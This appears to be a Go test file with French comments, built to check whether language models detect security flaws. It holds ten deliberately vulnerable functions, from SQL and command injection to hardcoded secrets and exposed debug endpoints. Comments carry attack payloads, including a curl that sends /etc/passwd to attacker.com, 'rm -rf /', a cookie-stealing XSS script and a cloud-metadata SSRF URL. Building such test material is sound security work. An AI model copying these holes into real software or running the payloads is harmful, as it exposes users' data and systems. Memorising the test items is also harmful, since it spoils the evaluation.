// FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (Go/Golang)
// Usage : évaluation LLM — détection failles sécurité Go
// Couverture : OWASP A01-A10:2025, CWE-89, CWE-78, CWE-918, CWE-327
// NE PAS déployer en production.

package main

import (
	"crypto/md5"
	"crypto/des"
	"crypto/sha1"
	"database/sql"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"text/template"
	"time"
	"unsafe"
)

// ─── FAILLE 1 : SQL Injection via fmt.Sprintf ────────────────────────────────
// OWASP A05:2025 | CWE-89 | CVSS 9.8
// Payload : username = "admin' OR '1'='1'--" | userId = "1 UNION SELECT password FROM users--"
func getUserByUsername(db *sql.DB, username string) (*User, error) {
	// fmt.Sprintf injecte directement la valeur — pas de paramètre lié
	query := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", username)
	row := db.QueryRow(query)

	var user User
	if err := row.Scan(&user.ID, &user.Username, &user.Password); err != nil {
		return nil, err  // message d'erreur SQL retourné au client
	}
	return &user, nil
}

func searchUsers(db *sql.DB, filter string, sortBy string) ([]User, error) {
	// Double injection : filter ET sortBy concaténés directement
	// Payload sortBy : "username; DROP TABLE users--" (stacked queries)
	query := fmt.Sprintf(
		"SELECT id, username, email, role FROM users WHERE status = 'active' AND name LIKE '%%%s%%' ORDER BY %s",
		filter, sortBy,  // ORDER BY non paramétrisable même avec PreparedStatement → injection
	)
	rows, err := db.Query(query)
	if err != nil {
		log.Printf("Query error: %v", err)  // log SQL avec payload injecté
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var u User
		rows.Scan(&u.ID, &u.Username, &u.Email, &u.Role)
		users = append(users, u)
	}
	return users, nil
}

// ─── FAILLE 2 : Command Injection ────────────────────────────────────────────
// OWASP A05:2025 | CWE-78 | CVSS 9.8
// Payload : filename = "report.pdf; rm -rf / #" ou "$(cat /etc/passwd)"
func generateReport(filename string) (string, error) {
	// exec.Command avec concaténation directe — injection de commandes
	cmd := exec.Command("sh", "-c", "pdflatex "+filename)
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("pdflatex error: %v, output: %s", err, output)
	}
	return string(output), nil
}

func convertImage(inputPath string, format string) error {
	// Deuxième argument aussi injectable
	// Payload format : "png; curl http://attacker.com/$(cat /etc/passwd |base64)"
	cmdStr := fmt.Sprintf("convert %s output.%s", inputPath, format)
	cmd := exec.Command("bash", "-c", cmdStr)
	return cmd.Run()
}

// ─── FAILLE 3 : Path Traversal ────────────────────────────────────────────────
// OWASP A01:2025 | CWE-22 | CVSS 7.5
// Payload : filename = "../../../../etc/passwd" ou "../../../root/.ssh/id_rsa"
func serveStaticFile(w http.ResponseWriter, r *http.Request) {
	filename := r.URL.Query().Get("file")

	// filepath.Join ne protège pas contre le path traversal — Clean() appelé mais...
	// "../../../etc/passwd" → filepath.Join("/var/www/static", "../../../etc/passwd") = "/etc/passwd"
	filePath := filepath.Join("/var/www/static", filename)

	// Pas de vérification que filePath commence par "/var/www/static"
	data, err := os.ReadFile(filePath)
	if err != nil {
		http.Error(w, err.Error(), 500)  // message d'erreur filesystem exposé
		return
	}
	w.Write(data)
}

func downloadUserFile(w http.ResponseWriter, r *http.Request) {
	userID := r.URL.Query().Get("user_id")
	filename := r.URL.Query().Get("filename")

	// IDOR + path traversal combinés
	// Payload : user_id=456&filename=../456/confidential.pdf
	path := fmt.Sprintf("/data/users/%s/%s", userID, filename)
	http.ServeFile(w, r, path)  // pas de validation du user_id vs session
}

// ─── FAILLE 4 : SSRF ──────────────────────────────────────────────────────────
// OWASP A10:2025 | CWE-918 | CVSS 8.8
// Payload : url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
func fetchExternalResource(url string) (string, error) {
	// Pas de validation de l'URL — l'attaquant peut pointer vers des services internes
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return string(body), nil
}

func proxyRequest(w http.ResponseWriter, r *http.Request) {
	targetURL := r.URL.Query().Get("target")

	// SSRF : aucune whitelist de domaines autorisés
	// Payload : target=http://internal-db:5432/, target=gopher://127.0.0.1:6379/_*1%0d%0a...
	client := &http.Client{
		Timeout: 30 * time.Second,
		// pas de restriction des redirections vers des IPs internes
	}
	resp, err := client.Get(targetURL)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	defer resp.Body.Close()
	io.Copy(w, resp.Body)
}

// ─── FAILLE 5 : Cryptographie faible ─────────────────────────────────────────
// OWASP A04:2025 | CWE-327, CWE-328 | CVSS 7.4
func hashPassword(password string) string {
	// MD5 : cassable par rainbow tables, déprécié depuis 2004
	h := md5.New()
	io.WriteString(h, password)
	return fmt.Sprintf("%x", h.Sum(nil))
}

func hashPasswordSHA1(password string) string {
	// SHA-1 : collision trouvée, déprécié (SHAttered attack 2017)
	h := sha1.New()
	io.WriteString(h, password)
	return fmt.Sprintf("%x", h.Sum(nil))
}

func encryptData(plaintext []byte) ([]byte, error) {
	// DES : clé de 56 bits — cassable en quelques heures (EFF DES Cracker)
	key := []byte("12345678")  // clé DES codée en dur — CRITICAL
	block, _ := des.NewCipher(key)
	ciphertext := make([]byte, len(plaintext))
	block.Encrypt(ciphertext, plaintext)  // ECB mode (un seul bloc)
	return ciphertext, nil
}

func generateToken(userID int) string {
	// math/rand non cryptographique — prédictible avec le seed
	// Payload : deviner le token en connaissant le timestamp de génération
	rand.Seed(time.Now().UnixNano())    // seed prévisible = token prévisible
	token := fmt.Sprintf("%d-%d", userID, rand.Int63())
	return token
}

// ─── FAILLE 6 : XSS via template Go ─────────────────────────────────────────
// OWASP A05:2025 | CWE-79 | CVSS 6.1
func renderUserTemplate(w http.ResponseWriter, username string, bio string) {
	// text/template au lieu de html/template — pas d'échappement HTML automatique
	// Payload : bio = "<script>document.location='http://attacker.com?c='+document.cookie</script>"
	tmpl := template.Must(template.New("user").Parse(`
		<html><body>
			<h1>Profil de {{ .Username }}</h1>
			<p>Bio: {{ .Bio }}</p>
		</body></html>
	`))
	// text/template n'échappe pas — XSS direct
	tmpl.Execute(w, map[string]string{
		"Username": username,
		"Bio":      bio,  // non échappé → XSS stocké
	})
}

// ─── FAILLE 7 : Race condition / TOCTOU ──────────────────────────────────────
// CWE-362 | CVSS 6.5
// Time-Of-Check-Time-Of-Use : vérification et utilisation non atomiques
var (
	userBalances = map[int]float64{1: 1000.0}
	mu           sync.Mutex
)

func transferMoney(fromID, toID int, amount float64) error {
	// Vérification sans verrou — race condition entre check et debit
	balance := userBalances[fromID]   // lecture non atomique
	if balance < amount {
		return fmt.Errorf("insufficient funds")
	}
	// Sans mu.Lock() ici → deux goroutines peuvent passer la vérification simultanément
	// Double-spending attack : envoyer 1000 concurrents → balance devient négative
	time.Sleep(1 * time.Millisecond)  // simulate processing
	userBalances[fromID] -= amount    // déduction non atomique
	userBalances[toID] += amount
	return nil
}

// ─── FAILLE 8 : Secrets en dur ────────────────────────────────────────────────
// OWASP A04:2025 | CWE-798 | CVSS 8.2
const (
	DatabasePassword = "prod_db_password_2026"   // CRITICAL : secret en dur
	JWTSecret        = "my-super-secret-key"      // CRITICAL : secret JWT en dur
	APIKey           = "sk-live-xxxxxxxxxxx"       // CRITICAL : clé API en dur
	S3BucketKey      = "AKIAIOSFODNN7EXAMPLE"      // CRITICAL : AWS Access Key codée en dur
	S3BucketSecret   = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // AWS Secret Key
)

// ─── FAILLE 9 : unsafe.Pointer — manipulation mémoire non sécurisée ──────────
// CWE-119 | CVSS 7.0
func readArbitraryMemory(addr uintptr, size int) []byte {
	// unsafe.Pointer permet de lire/écrire la mémoire arbitrairement
	// Si addr vient de l'utilisateur → lecture mémoire arbitraire
	ptr := unsafe.Pointer(addr)
	var result []byte
	for i := 0; i < size; i++ {
		b := *(*byte)(unsafe.Pointer(uintptr(ptr) + uintptr(i)))
		result = append(result, b)
	}
	return result
}

// ─── FAILLE 10 : HTTP sans timeout + exposition de debug ─────────────────────
// OWASP A05:2025 | CWE-400 | CVSS 5.3
func startServer() {
	mux := http.NewServeMux()

	// Route debug exposée en production — pprof expose profiling, goroutines, mémoire
	// Accessible par n'importe qui : curl http://prod.example.com/debug/pprof/
	mux.HandleFunc("/debug/pprof/", http.DefaultServeMux.ServeHTTP)

	// Endpoint qui expose les variables d'environnement complètes
	mux.HandleFunc("/debug/env", func(w http.ResponseWriter, r *http.Request) {
		for _, env := range os.Environ() {
			fmt.Fprintln(w, env)  // expose DATABASE_URL, API_KEY, JWT_SECRET, etc.
		}
	})

	// Serveur HTTP sans timeout — vulnérable aux slowloris / requêtes lentes
	server := &http.Server{
		Addr:    ":8080",
		Handler: mux,
		// ReadTimeout:  absent → slowloris attack possible
		// WriteTimeout: absent → requêtes infinies
		// IdleTimeout:  absent → connexions keepalive indéfinies
	}

	log.Fatal(server.ListenAndServe())  // HTTP (pas HTTPS) → données en clair
}

type User struct {
	ID       int
	Username string
	Password string
	Email    string
	Role     string
}

func main() {
	startServer()
}
